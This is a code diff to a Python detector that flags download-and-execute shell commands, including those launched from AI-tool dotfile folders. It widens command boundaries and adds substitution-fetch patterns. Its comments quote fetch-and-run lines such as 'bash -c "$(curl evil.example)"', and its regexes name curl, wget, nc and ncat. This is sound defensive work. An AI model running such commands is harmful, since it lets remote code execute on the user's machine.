@@ -33,9 +33,12 @@ _DOTFILE_DIRS = r"\.(?:claude|vscode|cursor|codex|github|windsurf)"
 # `&` backgrounds the command before it and runs the next
 # (`echo ready & curl evil`), so it is a boundary too — listed after `&&` in
 # the alternation so the two-character operator is tried first and a real
-# `&&` chain is never split into two bare-`&` boundaries. Over-splitting a
-# `2>&1` redirect only scans more, never less — the safe direction.
-_CMD_BOUNDARY = r"(?:^|\n|\r|&&|\|\||;|\||&)"
+# `&&` chain is never split into two bare-`&` boundaries. `(` opens a
+# subshell or substitution whose body runs in the same shell context
+# (`bash -c "$(curl evil.example)"`), so it bounds a command as well.
+# Over-splitting a `2>&1` redirect only scans more, never less — the safe
+# direction.
+_CMD_BOUNDARY = r"(?:^|\n|\r|&&|\|\||;|\||&|\()"
 
 _SCRIPT_FROM_DOTFILES_RE = re.compile(
     rf"""{_CMD_BOUNDARY}\s*
@@ -47,7 +50,21 @@ _SCRIPT_FROM_DOTFILES_RE = re.compile(
 )
 
 _DOWNLOAD_TOOL_RE = re.compile(r"\b(?:curl|wget)\b")
-_SHELL_SEPARATOR_RE = re.compile(r"(&&|;|\|)")
+# A fetch wrapped in process or command substitution feeds an interpreter
+# directly — `bash <(curl …)`, `bash -c "$(curl …)"` — with no shell
+# separator between the download and the interpreter, so the substitution
+# form is a download signal in its own right.
+_SUBSTITUTION_FETCH_RE = re.compile(
+    rf"""[<$]\(\s*(?:sudo\s+)?(?:curl|wget|nc|ncat)\b  # $(curl …)  <(curl …)
+        |`(?:sudo\s+)?(?:curl|wget|nc|ncat)\b          # `curl …`
+    """,
+    re.VERBOSE,
+)
+# The same boundary set as _CMD_BOUNDARY, so the tokenizer and the anchored
+# patterns in this module cannot drift: `||` is one operator (splitting on
+# bare `|` alone used to leave an empty middle segment that masqueraded as a
+# pipe), and a single `&` backgrounds and runs the next command.
+_SHELL_SEPARATOR_RE = re.compile(r"(&&|\|\||;|\||&)")
 _PIPE_INTERPRETER_SEGMENT_RE = re.compile(rf"^\s*{_SUDO}(?:{_INTERPRETER_CMD})\b")
 _CHAIN_INTERPRETER_SEGMENT_RE = re.compile(rf"^\s*{_SUDO}(?:{_INTERPRETER_CMD})\s+\S+")
 
@@ -70,25 +87,41 @@ def _downloads_and_executes(command: str) -> bool:
     # every repeated token. Tokenize shell separators once instead. Newlines
     # reset the chain because the original regex deliberately did not span
     # them; each line is still scanned independently by the network rule.
+    #
+    # Carry rules mirror the shell: a download stays live across any number
+    # of pipes because every stage consumes the previous stage's output, but
+    # across ``&&``/``;``/``&`` only an interpreter directly after the
+    # download pairs with it — in ``curl url; cat notes | python -`` the
+    # interpreter reads local files, not the download. Nothing crosses
+    # ``||``: its right side runs only when the download failed.
     for line in command.split("\n"):
         pieces = _SHELL_SEPARATOR_RE.split(line)
-        seen_download = False
+        piped_download = False
+        chained_download = False
         for index in range(0, len(pieces), 2):
+            via_pipe = False
+            via_chain = False
+            if index:
+                separator = pieces[index - 1]
+                if separator == "|":
+                    via_pipe = piped_download
+                elif separator != "||":  # "&&", ";", "&"
+                    via_chain = chained_download
             segment = pieces[index]
-            segment_downloads = _DOWNLOAD_TOOL_RE.search(segment) is not None
-            seen_download = seen_download or segment_downloads
-            if index + 2 >= len(pieces):
+            if not segment.strip():
                 continue
-            separator = pieces[index + 1]
-            following = pieces[index + 2]
-            if separator == "|" and seen_download and _PIPE_INTERPRETER_SEGMENT_RE.match(following):
+            segment_downloads = (
+                _DOWNLOAD_TOOL_RE.search(segment) is not None
+                or _SUBSTITUTION_FETCH_RE.search(segment) is not None
+            )
+            if segment_downloads and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
+                return True  # self-contained: bash <(curl …), bash -c "$(curl …)"
+            if via_pipe and _PIPE_INTERPRETER_SEGMENT_RE.match(segment):
                 return True
-            if (
-                separator in {"&&", ";"}
-                and seen_download
-                and _CHAIN_INTERPRETER_SEGMENT_RE.match(following)
-            ):
+            if via_chain and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
                 return True
+            piped_download = via_pipe or segment_downloads
+            chained_download = segment_downloads
     return False
 
 
